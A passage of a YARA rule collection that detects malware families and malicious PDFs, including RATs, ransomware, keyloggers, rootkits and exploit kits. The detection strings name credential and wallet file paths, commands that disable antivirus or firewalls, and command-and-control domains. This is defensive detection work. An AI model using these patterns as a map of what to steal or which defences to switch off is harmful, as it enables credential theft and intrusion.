strings:
$string0 = "NanoCore Client" nocase
$string1 = "NanoCore.Client" nocase
$string2 = "NanoCoreBase" nocase
$string5 = "NanoCoreSwiss" nocase
$string6 = "NanoCoreStressTester" nocase
condition:
1 of them
}
rule SSC_NanoCoreByKeyword
{
meta:
author = "@neonprimetime"
description = "NanoCore"
strings:
$string1 = "NanoBrowser" nocase
$string2 = "NanoScript" nocase
$string3 = "SurveillanceEx" nocase
$string4 = "NanoCoreStressTester" nocase
$string5 = "accident-investigation.aero" nocase
$string6 = "KeyboardLogging" nocase
condition:
3 of them
}
rule SSC_RemcosRATByName
{
meta:
author = "@neonprimetime"
description = "Remcos RAT"
strings:
$string0 = "Software\\Remcos" nocase
$string1 = "\\remcos\\" nocase
$string2 = "REMCOS v" nocase
$string4 = "Remcos_" nocase
condition:
1 of them
}
rule SSC_RemcosRATByKeyword
{
meta:
author = "@neonprimetime"
description = "Remcos RAT"
strings:
$string1 = "Keylogger Started" nocase
$string2 = "Connected to C&C" nocase
$string3 = "Screenshots" nocase
$string4 = "OpenCamera" nocase
$string5 = "Uploading file to C&C" nocase
$string6 = "Initializing connection to C&C" nocase
$string7 = "cleared!]" nocase
$string8 = "EnableLUA /t REG_DWORD /d 0" nocase
$string9 = "RemWatchdog" nocase
$string10 = "restarted by watchdog" nocase
condition:
3 of them
}
rule SSC_RevilRansomwareByName
{
meta:
author = "@neonprimetime"
description = "Revil/Sodinokibi Ransomware"
strings:
$string1 = "Sodinokibi" nocase
$string2 = "For google: Revil" nocase
condition:
any of them
}
rule SSC_RevilRansomwareByKeyword
{
meta:
author = "@neonprimetime"
description = "Revil/Sodinokibi Ransomware"
strings:
$string1 = "decryptor.top" nocase
$string2 = "nbody" nocase
$string3 = "bedbg" nocase
condition:
3 of them
}
rule SSC_NjRatByKeyword
{
meta:
author = "@neonprimetime"
description = "NjRat"
strings:
$string0 = "vitimas_" nocase
$string1 = "|'|'||'|'|" nocase
condition:
2 of them
}
rule SSC_LokibotByKeyword
{
meta:
author = "@neonprimetime"
description = "Lokibot"
strings:
$string0a = "five/fre.php" nocase
$string0b = "Panel/five" nocase
$string1 = "fre.php" nocase
$string2 = "Yandex\\YandexBrowser" nocase
$string3 = "\\Mozilla\\SeaMonkey\\profiles.ini" nocase
$string4 = "POP3 Password" nocase
$string5 = "Software\\SimonTatham\\PuTTY\\Sessions" nocase
$string6 = "EasyFTP\\data" nocase
$string7 = "aPLib v1.01" nocase
$string8 = "wcx_ftp.ini" nocase
condition:
$string0a or $string0b or ($string1 and ($string2 or $string3 or $string4 or $string5 or $string6 or $string7 or $string8))
}
rule SSC_RevengeRATByName
{
meta:
author = "@neonprimetime"
description = "Revenge RAT"
strings:
$string0 = "Revenge-RAT" nocase
condition:
1 of them
}
rule SSC_RevengeRATByKeyword
{
meta:
author = "@neonprimetime"
description = "Revenge RAT"
strings:
$capture1 = "Start Capture" nocase
$capture2 = "CaptureScreen" nocase
$dotnet1 = ".NET" nocase
$agent1 = "FirewallProduct" nocase
$agent2 = "AntiVirusProduct" nocase
$exfil1 = "USERDOMAIN=" nocase
condition:
$dotnet1 and ($capture1 or $capture2) and ($agent1 or $agent2) and $exfil1 and filesize > 3KB and filesize < 9999KB
}
rule SSC_BrushaLoaderByKeyword
{
meta:
author = "@neonprimetime"
description = "BrushaLoader"
strings:
$vbe = ".shellexecute" nocase
$xyzdomain = "xyz" nocase
$google = "www.google.com" nocase
condition:
$vbe and $xyzdomain and $google
}
rule SSC_AgentTeslaByKeyword
{
meta:
author = "@neonprimetime"
description = "Agent Tesla"
strings:
$checkip1 = "checkip.aws" nocase
$checkip2 = "checkip.amazon" nocase
$smtpexfil1 = "smtp." nocase
$smtpexfil2 = ":587" nocase
$dotnet1 = ".net" nocase
condition:
($checkip1 or $checkip2) and ($smtpexfil1 or $smtpexfil2) and $dotnet1
}
rule SSC_AzorultByKeyword
{
meta:
author = "@neonprimetime"
description = "Azorult"
strings:
$string1 = "wallet.dat" nocase
$string2 = "PasswordsList.txt" nocase
$string3 = "timeout.exe" nocase
$string4 = "Wscript.Shell" nocase
$string5 = "dotbit.me" nocase
condition:
3 of them
}
rule SSC_EmotetByKeyword
{
meta:
author = "@neonprimetime"
description = "Emotet Keyword"
strings:
$string1 = "acquiremailbox.exe" nocase
$string2 = "fillmailbox.exe" nocase
$string3 = "inboxmailbox.exe" nocase
$string4 = "mailboxacquire.exe" nocase
$string5 = "mailboxinbox.exe" nocase
$string6 = "mailboxmailbox.exe" nocase
$string7 = "manualmailbox.exe" nocase
$string8 = "monthlymailbox.exe" nocase
$string9 = "pdfmailbox.exe" nocase
$string10 = "publishmailbox.exe" nocase
$string11 = "deployinbox.exe" nocase
$string12 = "inboxinbox.exe" nocase
$string13 = "inboxnetsh.exe" nocase
$string14 = "mailboxinbox.exe" nocase
$string15 = "netshinbox.exe" nocase
$string16 = "createatargets.exe" nocase
$string17 = "ducktargets.exe" nocase
$string18 = "restoretargets.exe" nocase
$string19 = "sendtargets.exe" nocase
condition:
1 of them
}
rule SSC_PhoenixKeyloggerByName
{
meta:
author = "@neonprimetime"
description = "Phoenix Keylogger"
strings:
$string1 = "Phoenix Keylogger" nocase
condition:
1 of them
}
rule SSC_BetaBotByKeyword
{
meta:
author = "@neonprimetime"
description = "BetaBot"
strings:
$string1 = "OnAsyncDestroy" nocase
$string2 = "OnDestroySubject" nocase
$string3 = "OnRemoveExisting" nocase
$string4 = "ccnumber" nocase
condition:
all of them and filesize > 7KB and filesize < 9999KB
}
rule SSC_GenericBitcoinStealer
{
meta:
author = "@neonprimetime"
description = "Generic Bitcoin Stealer"
strings:
$string1 = "wallet.dat" nocase
$string2 = "\\wallets\\" nocase
$string3 = "\\Electrum" nocase
$string4 = "Coins\\" nocase
$string5 = "\\bitcoin" nocase
$string6 = "\\monero" nocase
$string7 = "electrum.dat" nocase
$string8 = "wallet_path" nocase
condition:
2 of them and filesize > 5KB and filesize < 7777KB
}
rule SSC_GenericCreditCardStealer
{
meta:
author = "@neonprimetime"
description = "Generic Credit Card Stealer"
strings:
$string1 = "ccnumber" nocase
$string2 = "expirationmonth" nocase
$string3 = "monthexpiration" nocase
$string4 = "card_number" nocase
$string5 = "securitycode=" nocase
$string6 = "=amex" nocase
$string7 = "=visa" nocase
$string8 = "cardnumber" nocase
condition:
1 of them
}
rule SSC_GenericWebTraffic
{
meta:
author = "@neonprimetime"
description = "Generic Web Traffic"
strings:
$string1 = "Server: lighttpd" nocase
$string2 = "Host: %s" nocase
$string3 = "POST %s" nocase
$string4 = ".php" nocase
condition:
all of them
}
rule SSC_ScreenCapSteal
{
meta:
author = "@neonprimetime"
description = "Generic Screen Capture"
strings:
$string1 = "CaptureScreen"
$string2 = "GetDC"
$s3 = "CreateCompatibleDC"
$s4 = "BitBlt"
condition:
3 of them and filesize > 10KB and filesize < 26000KB
}
rule SSC_GenericCredentialStealer
{
meta:
author = "@neonprimetime"
description = "Generic Credential Stealer"
strings:
$string1 = "Profiles\\Outlook" nocase
$string2 = "Login Data" nocase
$string3 = "encryptedPassword" nocase
$string4 = "HTTP Password" nocase
$string5 = "\\profiles.ini" nocase
$string6 = "\\POP3 Password" nocase
$string7 = "PuTTY\\Sessions" nocase
$string8 = "EasyFTP\\data" nocase
$string9 = "Ftplist.txt" nocase
$string10 = "\\Login Data" nocase
$string11 = "\\ws_ftp.ini" nocase
$string13 = "\\accounts.ini" nocase
$string14 = "\\accounts.dat" nocase
$string15 = "CREATE TABLE logins" nocase
$string16 = "CREATE INDEX logins_signon" nocase
$string17 = "DecryptIePassword" nocase
$string18 = "GetSavedPasswords" nocase
$string19 = "\\Passwords\\" nocase
$string20 = "WinSCP 2\\Sessions" nocase
$string21 = "\\HTTP Password" nocase
$string22 = "\\IMAP Password" nocase
$string23 = "\\SMTP Password" nocase
$string24 = "\\HTTP Password" nocase
$string25 = "[passwords]" nocase
$string26 = "login-form" nocase
$string27 = "recentservers.xml" nocase
$string28 = "type=passwords" nocase
$string29 = "user-password" nocase
$string30 = "PasswordsList.txt" nocase
condition:
3 of them and filesize > 1KB and filesize < 13000KB
}
rule SSC_GenericBrowserHistoryStealer
{
meta:
author = "@neonprimetime"
description = "Generic Browser History Stealer"
strings:
$string1 = "from urls" nocase
$string2 = "from moz_places" nocase
condition:
1 of them
}
rule SSC_GenericDataStealer
{
meta:
author = "@neonprimetime"
description = "Generic Data Stealer"
strings:
$string0 = "\\User Data" nocase
$string1 = "360Chrome\\" nocase
$string2 = "7Star\\" nocase
$string3 = "Cyberfox\\" nocase
$string4 = "Amigo\\" nocase
$string5 = "Apple Computer\\" nocase
$string6 = "BraveSoftware\\" nocase
$string7 = "CatalinaGroup\\" nocase
$string8 = "CentBrowser\\" nocase
$string9 = "Chedot\\" nocase
$string10 = "Chromium\\" nocase
$string11 = "Claws-mail\\" nocase
$string12 = "CocCoc\\" nocase
$string13 = "Comodo\\" nocase
$string14 = "Coowon\\" nocase
$string15 = "CoreFTP\\" nocase
$string16 = "Elements Browser\\" nocase
$string17 = "Epic Privacy Browser\\" nocase
$string18 = "falkon\\" nocase
$string19 = "Fenrir Inc\\" nocase
$string20 = "FileZilla\\" nocase
$string21 = "Flock\\" nocase
$string22 = "FTPGetter\\" nocase
$string23 = "Google\\" nocase
$string24 = "Ipswitch\\" nocase
$string25 = "Iridium\\" nocase
$string26 = "K-Meleon\\" nocase
$string27 = "Kometa\\" nocase
$string28 = "liebao\\" nocase
$string29 = "MapleStudio\\" nocase
$string31 = "Moonchild Productions\\" nocase
$string32 = "Mozilla\\" nocase
$string35 = "NETGATE Technologies\\" nocase
$string36 = "Opera Mail\\" nocase
$string37 = "Opera Software\\" nocase
$string38 = "Orbitum\\" nocase
$string39 = "Pocomail\\" nocase
$string40 = "Postbox\\" nocase
$string41 = "Psi\\" nocase
$string42 = "Psi+\\" nocase
$string43 = "QIP Surf\\" nocase
$string45 = "SmartFTP\\" nocase
$string46 = "Sputnik\\" nocase
$string47 = "Tencent\\" nocase
$string48 = "The Bat!" nocase
$string49 = "Thunderbird\\" nocase
$string50 = "Torch\\" nocase
$string51 = "Trillian\\" nocase
$string52 = "UCBrowser\\" nocase
$string53 = "uCozMedia\\" nocase
$string54 = "VirtualStore\\" nocase
$string55 = "Vivaldi\\" nocase
$string56 = "Waterfox\\" nocase
$string57 = "Yandex\\" nocase
$string58 = "keychain.plist" nocase
$string59 = "GetSavedCookies" nocase
$string60 = "wcx_ftp.ini" nocase
$string61 = "Start Capture" nocase
$string62 = "\\accounts.xml" nocase
$string63 = "\\places.sqlite" nocase
$string67 = "cookies.sqlite" nocase
condition:
3 of them and filesize > 2KB and filesize < 20000KB
}
rule SSC_GenericMaliciousCommand
{
meta:
author = "@neonprimetime"
description = "Generic Malicious Command"
strings:
$string1 = "CompSpec" nocase
condition:
1 of them
}
rule SSC_KeyLogStealer_Generic
{
meta:
author = "@neonprimetime"
description = "Generic Keylogger"
strings:
$X1 = "Keylog" nocase
$X2 = "KeyboardLogging" nocase
$s7 = "AttachThreadInput"
$s8 = "GetAsyncKeyState"
$s9 = "GetKeyState"
$s4 = "MapVirtualKey"
$s3 = "GetKeyboardType"
$s5 = "CallNextHookEx"
condition:
filesize > 1KB and filesize < 12000KB and (( any of ($X*) and 1 of ($s*) ) or (3 of ($s*)))
}
rule SSC_GenericSecurityToolDetection
{
meta:
author = "@neonprimetime"
description = "Generic Security Tool Detection"
strings:
$string1 = "FROM FirewallProduct" nocase
$string2 = "from AntiVirusProduct" nocase
condition:
1 of them
}
rule SSC_GenericDisableAntivirus
{
meta:
author = "@neonprimetime"
description = "Generic Disable AntiVirus"
strings:
$string1 = "DisableBehaviorMonitoring" nocase
$string2 = "DisableOnAccessProtection" nocase
$string3 = "DisableScanOnRealtime" nocase
$string4 = "DisableRealtimeMonitoring" nocase
$string5 = "DisableBlockAtFirstSeen" nocase
$string6 = "DisableIOAVProtection" nocase
$string7 = "DisableAntiSpyware" nocase
$string8 = "DisableArchiveScanning" nocase
$string9 = "DisableScriptScanning" nocase
$string10 = "Set-MpPreference" nocase
condition:
1 of them and filesize > 1KB and filesize < 20000KB
}
rule SSC_GenericFirewallModification
{
meta:
author = "@neonprimetime"
description = "Generic Firewall Modifiction"
strings:
$string1 = "netsh advfirewall" nocase
$string2 = "firewall add" nocase
condition:
1 of them and filesize > 1KB and filesize < 19000KB
}
rule SSC_GenericHackerTerms
{
meta:
author = "@neonprimetime"
description = "Generic Hacker Terms"
strings:
$string1 = "payloadpath" nocase
$string2 = "payloadexist" nocase
condition:
1 of them
}
rule SSC_GenericPasswordList
{
meta:
author = "@neonprimetime"
description = "Generic Password List"
strings:
$string1 = "peternorth" nocase
$string2 = "motherfucker" nocase
$string3 = "pimpdaddy" nocase
$string4 = "ihavenopass" nocase
$string5 = "fuckoff" nocase
$string6 = "dickhead" nocase
$string7 = "passw0rd" nocase
$string8 = "changeme" nocase
condition:
1 of them and filesize > 10 and filesize < 888KB
}
rule SSC_Unsafe_FireWall_AntyX
{
strings:
$s1 = "netsh firewall delete" nocase ascii wide
condition:
any of them and filesize > 1KB and filesize < 1000KB
}
rule SSC_Unsafe_STR_CER_SusP
{
strings:
$magic  = { 4D 5A }
$s1 = "CertOpenSystemStore"
$s2 = "CRYPT32.dll"
condition:
$magic at 0 and all of ($s*) and filesize > 10KB and filesize < 7777KB
}
rule SSC_VBA_Dangerous_AutoRunX
{
strings:
$a = "AutoExec" nocase fullword
$b = "AutoOpen" nocase fullword
$c = "DocumentOpen" nocase fullword
$d = "AutoExit" nocase fullword
$e = "AutoClose" nocase fullword
$f = "Document_Close" nocase fullword
$g = "DocumentBeforeClose" nocase fullword
$h = "Document_Open" nocase fullword
$i = "Document_BeforeClose" nocase fullword
$j = "Auto_Open" nocase fullword
$k = "Workbook_Open" nocase fullword
$l = "Workbook_Activate" nocase fullword
$m = "Auto_Close" nocase fullword
$n = "Workbook_Close" nocase fullword
condition:
VBA and 10 of ($*) and filesize > 1KB and filesize < 12000KB
}
rule SSC_bleedinglife2_adobe_2010_2884_exploit : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "BleedingLife2 Exploit Kit Detection"
hash0 = "b22ac6bea520181947e7855cd317c9ac"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "_autoRepeat"
$string1 = "embedFonts"
$string2 = "KeyboardEvent"
$string3 = "instanceStyles"
$string4 = "InvalidationType"
$string5 = "autoRepeat"
$string6 = "getScaleX"
$string7 = "RadioButton_selectedDownIcon"
$string8 = "configUI"
$string9 = "deactivate"
$string10 = "fl.controls:Button"
$string11 = "_mouseStateLocked"
$string12 = "fl.core.ComponentShim"
$string13 = "toString"
$string14 = "_group"
$string15 = "addRadioButton"
$string16 = "inCallLaterPhase"
$string17 = "oldMouseState"
condition:
17 of them
}
rule SSC_bleedinglife2_jar2 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "BleedingLife2 Exploit Kit Detection"
hash0 = "2bc0619f9a0c483f3fd6bce88148a7ab"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "META-INF/MANIFEST.MFPK"
$string1 = "RequiredJavaComponent.classPK"
$string2 = "META-INF/JAVA.SFm"
$string3 = "RequiredJavaComponent.class"
$string4 = "META-INF/MANIFEST.MF"
$string5 = "META-INF/JAVA.DSAPK"
$string6 = "META-INF/JAVA.SFPK"
$string7 = "5EVTwkx"
$string8 = "META-INF/JAVA.DSA3hb"
$string9 = "y\\Dw -"
condition:
9 of them
}
rule SSC_bleedinglife2_adobe_2010_1297_exploit : EK PDF
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "BleedingLife2 Exploit Kit Detection"
hash0 = "8179a7f91965731daa16722bd95f0fcf"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "getSharedStyle"
$string1 = "currentCount"
$string2 = "String"
$string3 = "setSelection"
$string4 = "BOTTOM"
$string5 = "classToInstancesDict"
$string6 = "buttonDown"
$string7 = "focusRect"
$string8 = "pill11"
$string9 = "TEXT_INPUT"
$string10 = "restrict"
$string11 = "defaultButtonEnabled"
$string12 = "copyStylesToChild"
$string13 = " xmlns:xmpMM"
$string14 = "_editable"
$string15 = "classToDefaultStylesDict"
$string16 = "IMEConversionMode"
$string17 = "Scene 1"
condition:
17 of them
}
rule SSC_LinuxTsunami
{
meta:
Author      = "@benkow_"
Date        = "2014/09/12"
Description = "Strings inside"
Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483"
strings:
$a = "PRIVMSG %s :[STD]Hitting %s"
$b = "NOTICE %s :TSUNAMI <target> <secs>"
$c = "NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually."
condition:
$a or $b or $c
}
rule SSC_LinuxElknot
{
meta:
Author      = "@benkow_"
Date        = "2013/12/24"
Description = "Strings inside"
Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3099"
strings:
$a = "ZN8CUtility7DeCryptEPciPKci"
$b = "ZN13CThreadAttack5StartEP11CCmdMessage"
condition:
all of them
}
rule SSC_exploit
{
meta:
author="xorseed"
reference= "https://stuff.rop.io/"
strings:
$xpl1 = "set_fs_root" nocase ascii wide
$xpl2 = "set_fs_pwd" nocase ascii wide
$xpl3 = "__virt_addr_valid" nocase ascii wide
$xpl4 = "init_task" nocase ascii wide
$xpl5 = "init_fs" nocase ascii wide
$xpl6 = "bad_file_ops" nocase ascii wide
$xpl7 = "bad_file_aio_read" nocase ascii wide
$xpl8 = "security_ops" nocase ascii wide
$xpl9 = "default_security_ops" nocase ascii wide
$xpl10 = "audit_enabled" nocase ascii wide
$xpl11 = "commit_creds" nocase ascii wide
$xpl12 = "prepare_kernel_cred" nocase ascii wide
$xpl13 = "ptmx_fops" nocase ascii wide
$xpl14 = "node_states" nocase ascii wide
condition:
7 of them
}
rule SSC_LinuxMrBlack
{
meta:
Author      = "@benkow_"
Date        = "2014/09/12"
Description = "Strings inside"
Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483"
strings:
$a = "Mr.Black"
$b = "VERS0NEX:%s|%d|%d|%s"
condition:
$a and $b
}
rule SSC_LinuxBillGates
{
meta:
Author      = "@benkow_"
Date        = "2014/08/11"
Description = "Strings inside"
Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3429"
strings:
$a= "12CUpdateGates"
$b= "11CUpdateBill"
condition:
$a and $b
}
rule SSC_rootkit
{
meta:
author="xorseed"
reference= "https://stuff.rop.io/"
strings:
$sys1 = "sys_write" nocase ascii wide
$sys2 = "sys_getdents" nocase ascii wide
$sys3 = "sys_getdents64" nocase ascii wide
$sys4 = "sys_getpgid" nocase ascii wide
$sys5 = "sys_getsid" nocase ascii wide
$sys6 = "sys_setpgid" nocase ascii wide
$sys7 = "sys_kill" nocase ascii wide
$sys8 = "sys_tgkill" nocase ascii wide
$sys9 = "sys_tkill" nocase ascii wide
$sys10 = "sys_sched_setscheduler" nocase ascii wide
$sys11 = "sys_sched_setparam" nocase ascii wide
$sys12 = "sys_sched_getscheduler" nocase ascii wide
$sys13 = "sys_sched_getparam" nocase ascii wide
$sys14 = "sys_sched_setaffinity" nocase ascii wide
$sys15 = "sys_sched_getaffinity" nocase ascii wide
$sys16 = "sys_sched_rr_get_interval" nocase ascii wide
$sys17 = "sys_wait4" nocase ascii wide
$sys18 = "sys_waitid" nocase ascii wide
$sys19 = "sys_rt_tgsigqueueinfo" nocase ascii wide
$sys20 = "sys_rt_sigqueueinfo" nocase ascii wide
$sys21 = "sys_prlimit64" nocase ascii wide
$sys22 = "sys_ptrace" nocase ascii wide
$sys23 = "sys_migrate_pages" nocase ascii wide
$sys24 = "sys_move_pages" nocase ascii wide
$sys25 = "sys_get_robust_list" nocase ascii wide
$sys26 = "sys_perf_event_open" nocase ascii wide
$sys27 = "sys_uname" nocase ascii wide
$sys28 = "sys_unlink" nocase ascii wide
$sys29 = "sys_unlikat" nocase ascii wide
$sys30 = "sys_rename" nocase ascii wide
$sys31 = "sys_read" nocase ascii wide
$sys32 = "kobject_del" nocase ascii wide
$sys33 = "list_del_init" nocase ascii wide
$sys34 = "inet_ioctl" nocase ascii wide
condition:
9 of them
}
rule SSC_invalid_XObject_js : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
description = "XObject's require v1.4+"
ref = "https://blogs.adobe.com/ReferenceXObjects/"
version = "0.1"
weight = 2
strings:
$magic = { 25 50 44 46 }
$ver = /%PDF-1\.[4-9]/
$attrib0 = /\/XObject/
$attrib1 = /\/JavaScript/
condition:
$magic in (0..1024) and not $ver and all of ($attrib*)
}
rule SSC_suspicious_creator : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.1"
weight = 3
strings:
$magic = { 25 50 44 46 }
$header = /%PDF-1\.(3|4|6)/
$creator0 = "yen vaw"
$creator1 = "Scribus"
$creator2 = "Viraciregavi"
condition:
$magic in (0..1024) and $header and 1 of ($creator*)
}
rule SSC_XDP_embedded_PDF : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.1"
ref = "http://blog.9bplus.com/av-bypass-for-malicious-pdfs-using-xdp"
weight = 1
strings:
$s1 = "<pdf xmlns="
$s2 = "<chunk>"
$s3 = "</pdf>"
$header0 = "%PDF"
$header1 = "JVBERi0"
condition:
all of ($s*) and 1 of ($header*)
}
rule SSC_multiple_filtering : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.2"
weight = 3
strings:
$magic = { 25 50 44 46 }
$attrib = /\/Filter.*(\/ASCIIHexDecode\W+|\/LZWDecode\W+|\/ASCII85Decode\W+|\/FlateDecode\W+|\/RunLengthDecode){2}/
// left out: /CCITTFaxDecode, JBIG2Decode, DCTDecode, JPXDecode, Crypt
condition:
$magic in (0..2) and $attrib
}
rule SSC_suspicious_author : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.1"
weight = 4
strings:
$magic = { 25 50 44 46 }
$header = /%PDF-1\.(3|4|6)/
$author0 = "Ubzg1QUbzuzgUbRjvcUb14RjUb1"
$author1 = "ser pes"
$author2 = "Miekiemoes"
$author3 = "Nsarkolke"
condition:
$magic in (0..1024) and $header and 1 of ($author*)
}
rule SSC_PDF_Embedded_Exe : PDF
{
meta:
ref = "https://github.com/jacobsoo/Yara-Rules/blob/master/PDF_Embedded_Exe.yar"
strings:
$header = {25 50 44 46}
$Launch_Action = {3C 3C 2F 53 2F 4C 61 75 6E 63 68 2F 54 79 70 65 2F 41 63 74 69 6F 6E 2F 57 69 6E 3C 3C 2F 46}
$exe = {3C 3C 2F 45 6D 62 65 64 64 65 64 46 69 6C 65 73}
condition:
$header at 0 and $Launch_Action and $exe
}
rule SSC_shellcode_blob_metadata : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.1"
description = "When there's a large Base64 blob inserted into metadata fields it often indicates shellcode to later be decoded"
weight = 4
strings:
$magic = { 25 50 44 46 }
$reg_keyword = /\/Keywords.?\(([a-zA-Z0-9]{200,})/ //~6k was observed in BHEHv2 PDF exploits holding the shellcode
$reg_author = /\/Author.?\(([a-zA-Z0-9]{200,})/
$reg_title = /\/Title.?\(([a-zA-Z0-9]{200,})/
$reg_producer = /\/Producer.?\(([a-zA-Z0-9]{200,})/
$reg_creator = /\/Creator.?\(([a-zA-Z0-9]{300,})/
$reg_create = /\/CreationDate.?\(([a-zA-Z0-9]{200,})/
condition:
$magic in (0..1024) and 1 of ($reg*)
}
rule SSC_suspicious_title : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.1"
weight = 4
strings:
$magic = { 25 50 44 46 }
$header = /%PDF-1\.(3|4|6)/
$title0 = "who cis"
$title1 = "P66N7FF"
$title2 = "Fohcirya"
condition:
$magic in (0..1024) and $header and 1 of ($title*)
}
rule SSC_suspicious_launch_action : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.1"
weight = 2
strings:
$magic = { 25 50 44 46 }
$attrib0 = /\/Launch/
$attrib1 = /\/URL /
$attrib2 = /\/Action/
$attrib3 = /\/OpenAction/
$attrib4 = /\/F /
condition:
$magic in (0..1024) and 4 of ($attrib*)
}
rule SSC_BlackHole_v2 : PDF raw
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.1"
ref = "http://fortknoxnetworks.blogspot.no/2012/10/blackhhole-exploit-kit-v-20-url-pattern.html"
weight = 3
strings:
$magic = { 25 50 44 46 }
$content = "Index[5 1 7 1 9 4 23 4 50"
condition:
$magic in (0..1024) and $content
}
rule SSC_SLServer_command_and_control
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Searches for the C2 server."
ref = "https://citizenlab.org/2016/04/between-hong-kong-and-burma/"
strings:
$c2 = "safetyssl.security-centers.com"
condition:
//MZ header //PE signature
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $c2
}
rule SSC_dubseven_dropper_registry_checks
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Searches for registry keys checked for by the dropper"
strings:
$reg1 = "SOFTWARE\\360Safe\\Liveup"
$reg2 = "Software\\360safe"
$reg3 = "SOFTWARE\\kingsoft\\Antivirus"
$reg4 = "SOFTWARE\\Avira\\Avira Destop"
$reg5 = "SOFTWARE\\rising\\RAV"
$reg6 = "SOFTWARE\\JiangMin"
$reg7 = "SOFTWARE\\Micropoint\\Anti-Attack"
condition:
//MZ header //PE signature
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of ($reg*)
}
rule SSC_dubseven_dropper_dialog_remains
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Searches for related dialog remnants. How rude."
strings:
$dia1 = "fuckMessageBox 1.0" wide
$dia2 = "Rundll 1.0" wide
condition:
//MZ header //PE signature
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and any of them
}
rule SSC_dubseven_file_set
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Searches for service files loading UP007"
strings:
$file1 = "\\Microsoft\\Internet Explorer\\conhost.exe"
$file2 = "\\Microsoft\\Internet Explorer\\dll2.xor"
$file3 = "\\Microsoft\\Internet Explorer\\HOOK.DLL"
$file4 = "\\Microsoft\\Internet Explorer\\main.dll"
$file5 = "\\Microsoft\\Internet Explorer\\nvsvc.exe"
$file6 = "\\Microsoft\\Internet Explorer\\SBieDll.dll"
$file7 = "\\Microsoft\\Internet Explorer\\mon"
$file8 = "\\Microsoft\\Internet Explorer\\runas.exe"
condition:
//MZ header //PE signature //Just a few of these as they differ
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 3 of ($file*)
}
rule SSC_SLServer_mutex
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Searches for the mutex."
ref = "https://citizenlab.org/2016/04/between-hong-kong-and-burma/"
strings:
$mutex = "M&GX^DSF&DA@F"
condition:
//MZ header //PE signature
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $mutex
}
rule SSC_SLServer_campaign_code
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Searches for the related campaign code."
ref = "https://citizenlab.org/2016/04/between-hong-kong-and-burma/"
strings:
$campaign = "wthkdoc0106"
condition:
//MZ header //PE signature
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $campaign
}
rule SSC_SLServer_unknown_string
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Searches for a unique string."
ref = "https://citizenlab.org/2016/04/between-hong-kong-and-burma/"
strings:
$string = "test-b7fa835a39"
condition:
//MZ header //PE signature
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $string
}
rule SSC_maindll_mutex
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Matches on the maindll mutex"
ref = "https://citizenlab.org/2016/04/between-hong-kong-and-burma/"
strings:
$mutex = "h31415927tttt"
condition:
//MZ header  //PE signature
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $mutex
}
rule SSC_spyeye : banker
{
meta:
author = "Jean-Philippe Teissier / @Jipe_"
description = "SpyEye X.Y memory"
date = "2012-05-23"
version = "1.0"
filetype = "memory"
strings:
$spyeye = "SpyEye"
$a = "%BOTNAME%"
$b = "globplugins"
$c = "data_inject"
$d = "data_before"
$e = "data_after"
$f = "data_end"
$g = "bot_version"
$h = "bot_guid"
$i = "TakeBotGuid"
$j = "TakeGateToCollector"
$k = "[ERROR] : Omfg! Process is still active? Lets kill that mazafaka!"
$l = "[ERROR] : Update is not successfull for some reason"
$m = "[ERROR] : dwErr == %u"
$n = "GRABBED DATA"
condition:
$spyeye or (3 of ($a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n))
}
rule SSC_OlyxStrings : Olyx Family
{
meta:
description = "Olyx Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-19"
strings:
$ = "/Applications/Automator.app/Contents/MacOS/DockLight"
condition:
any of them
}
rule SSC_OlyxCode : Olyx Family
{
meta:
description = "Olyx code tricks"
author = "Seth Hardy"
last_modified = "2014-06-19"
strings:
$six = { C7 40 04 36 36 36 36 C7 40 08 36 36 36 36 }
$slash = { C7 40 04 5C 5C 5C 5C C7 40 08 5C 5C 5C 5C }
condition:
any of them
}
rule SSC_PubSabStrings : PubSab Family
{
meta:
description = "PubSab Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-19"
strings:
$ = "_deamon_init"
$ = "com.apple.PubSabAgent"
